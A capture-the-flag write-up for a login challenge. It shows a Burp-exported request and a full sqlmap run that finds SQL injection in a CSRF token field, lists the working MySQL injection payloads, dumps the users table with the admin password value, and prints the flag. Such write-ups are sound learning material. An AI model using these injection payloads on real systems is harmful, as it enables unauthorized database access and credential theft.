#Login- 400
Help Keith login to a super secure website! 

http://ctf.1e100.io/login4/

Deceptively Easy, after running sqlmap once and discovering the csrf token was injectable, the database can be dumped:

```bash
root@kali:~/Desktop# cat asdf
<?xml version="1.0"?>
<!DOCTYPE items [
<!ELEMENT items (item*)>
<!ATTLIST items burpVersion CDATA "">
<!ATTLIST items exportTime CDATA "">
<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT url (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT port (#PCDATA)>
<!ELEMENT protocol (#PCDATA)>
<!ELEMENT method (#PCDATA)>
<!ELEMENT path (#PCDATA)>
<!ELEMENT extension (#PCDATA)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT status (#PCDATA)>
<!ELEMENT responselength (#PCDATA)>
<!ELEMENT mimetype (#PCDATA)>
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT comment (#PCDATA)>
]>
<items burpVersion="1.6.01" exportTime="Thu May 19 19:58:00 EDT 2016">
  <item>
    <time>Thu May 19 19:57:31 EDT 2016</time>
    <url><![CDATA[http://ctf.1e100.io/login4/login.php]]></url>
    <host ip="104.18.37.126">ctf.1e100.io</host>
    <port>80</port>
    <protocol>http</protocol>
    <method>POST</method>
    <path><![CDATA[/login4/login.php]]></path>
    <extension>php</extension>
    <request base64="true"><![CDATA[UE9TVCAvbG9naW40L2xvZ2luLnBocCBIVFRQLzEuMQ0KSG9zdDogY3RmLjFlMTAwLmlvDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQ7IHJ2OjMxLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMzEuMCBJY2V3ZWFzZWwvMzEuOC4wDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpSZWZlcmVyOiBodHRwOi8vY3RmLjFlMTAwLmlvL2xvZ2luNC8NCkNvb2tpZTogX19jZmR1aWQ9ZDI0ZTg5MzY5NzdiM2E2MTBhNWNmOWJkZmQ3ZmFlZDgwMTQ2MzcwMjI0NA0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA5NQ0KDQpjc3JmX3Rva2VuPTFmMzQyNjM3M2JhYmY2MmMwYTQ4Y2FjYWUxMWVlMThkNjkzNzQwZTYzNTNhOWQ0ZDkyYTA5MDc2ZjQ2NmIxNGYmdXNlcm5hbWU9JnBhc3N3b3JkPQ==]]></request>
    <status></status>
    <responselength></responselength>
    <mimetype></mimetype>
    <response base64="true"></response>
    <comment></comment>
  </item>
</items>
root@kali:~/Desktop# sqlmap -l asdf --dump
         _
 ___ ___| |_____ ___ ___  {1.0-dev-nongit-20160315}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 11:32:32

[11:32:32] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
URL 1:
GET http://ctf.1e100.io:80/login4/login.php
Cookie: __cfduid=d24e8936977b3a610a5cf9bdfd7faed801463702244
POST data: csrf_token=1f3426373babf62c0a48cacae11ee18d693740e6353a9d4d92a09076f466b14f&username=&password=
do you want to test this URL? [Y/n/q]
> Y
[11:32:35] [INFO] testing URL 'http://ctf.1e100.io:80/login4/login.php'
POST parameter 'csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[11:32:38] [INFO] resuming back-end DBMS 'mysql' 
[11:32:38] [INFO] using '/root/.sqlmap/output/results-05222016_1132am.csv' as the CSV results file in multiple targets mode
[11:32:38] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: csrf_token (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: csrf_token=1f3426373babf62c0a48cacae11ee18d693740e6353a9d4d92a09076f466b14f' RLIKE (SELECT (CASE WHEN (3106=3106) THEN 0x31663334323633373362616266363263306134386361636165313165653138643639333734306536333533613964346439326130393037366634363662313466 ELSE 0x28 END)) AND 'sJSS'='sJSS&username=&password=

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: csrf_token=1f3426373babf62c0a48cacae11ee18d693740e6353a9d4d92a09076f466b14f' AND (SELECT 4409 FROM(SELECT COUNT(*),CONCAT(0x7171626a71,(SELECT (ELT(4409=4409,1))),0x717a786b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'qHLX'='qHLX&username=&password=

    Type: stacked queries
    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
    Payload: csrf_token=1f3426373babf62c0a48cacae11ee18d693740e6353a9d4d92a09076f466b14f';(SELECT * FROM (SELECT(SLEEP(5)))wdhf)#&username=&password=

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: csrf_token=1f3426373babf62c0a48cacae11ee18d693740e6353a9d4d92a09076f466b14f' AND (SELECT * FROM (SELECT(SLEEP(5)))yKcc) AND 'etJO'='etJO&username=&password=
---
do you want to exploit this SQL injection? [Y/n] Y
[11:32:43] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.0.6
back-end DBMS: MySQL 5.0
[11:32:43] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[11:32:43] [INFO] fetching current database
[11:32:43] [INFO] resumed: login4
[11:32:43] [INFO] fetching tables for database: 'login4'
[11:32:43] [INFO] the SQL query used returns 2 entries
[11:32:43] [INFO] resumed: session
[11:32:43] [INFO] resumed: users
[11:32:43] [INFO] fetching columns for table 'session' in database 'login4'
[11:32:43] [INFO] the SQL query used returns 1 entries
[11:32:43] [INFO] resumed: csrf_token
[11:32:43] [INFO] resumed: varchar(64)
[11:32:43] [INFO] fetching entries for table 'session' in database 'login4'
[11:32:43] [INFO] fetching number of entries for table 'session' in database 'login4'
[11:32:43] [INFO] resumed: 0
[11:32:43] [WARNING] table 'session' in database 'login4' appears to be empty
Database: login4
Table: session
[0 entries]
+------------+
| csrf_token |
+------------+
+------------+

[11:32:43] [WARNING] table 'login4.`session`' dumped to CSV file '/root/.sqlmap/output/ctf.1e100.io/dump/login4/session-ec9216c0.csv'
[11:32:43] [INFO] fetching columns for table 'users' in database 'login4'
[11:32:43] [INFO] the SQL query used returns 2 entries
[11:32:43] [INFO] resumed: username
[11:32:43] [INFO] resumed: varchar(36)
[11:32:43] [INFO] resumed: password
[11:32:43] [INFO] resumed: varchar(64)
[11:32:43] [INFO] fetching entries for table 'users' in database 'login4'
[11:32:43] [INFO] the SQL query used returns 1 entries
[11:32:43] [INFO] resumed: b7a7b7a7980cb0b3fa24c4e5986ce33d9c77ded27ab146a853184e4a4c7ffeb0
[11:32:43] [INFO] resumed: admin
[11:32:43] [INFO] analyzing table dump for possible password hashes
[11:32:43] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing y
[11:32:51] [INFO] writing hashes to a temporary file '/tmp/sqlmapon3BxU1402/sqlmaphashes-t7f92G.txt' 
do you want to crack them via a dictionary-based attack? [y/N/q] y
[11:32:52] [INFO] using hash method 'sha512_generic_passwd'
[11:32:52] [WARNING] no clear password(s) found
[11:32:52] [INFO] postprocessing table dump
Database: login4
Table: users
[1 entry]
+----------+------------------------------------------------------------------+
| username | password                                                         |
+----------+------------------------------------------------------------------+
| admin    | b7a7b7a7980cb0b3fa24c4e5986ce33d9c77ded27ab146a853184e4a4c7ffeb0 |
+----------+------------------------------------------------------------------+

[11:32:52] [INFO] table 'login4.users' dumped to CSV file '/root/.sqlmap/output/ctf.1e100.io/dump/login4/users.csv'
[11:32:52] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-05222016_1132am.csv'

[*] shutting down at 11:32:52

```

Originally I thought the password was hashed but entering username admin and password b7a7b7a7980cb0b3fa24c4e5986ce33d9c77ded27ab146a853184e4a4c7ffeb0
renders the page

Congrats! The flag is bba238a457b21f32cfe658f5c4064073ef2a8379ec1fb8bef5515f141449afd87440227ebc3657423f655a1f0990e4b991cca01f31a762fad18f76cb7a6bdd78

flag: bba238a457b21f32cfe658f5c4064073ef2a8379ec1fb8bef5515f141449afd87440227ebc3657423f655a1f0990e4b991cca01f31a762fad18f76cb7a6bdd78
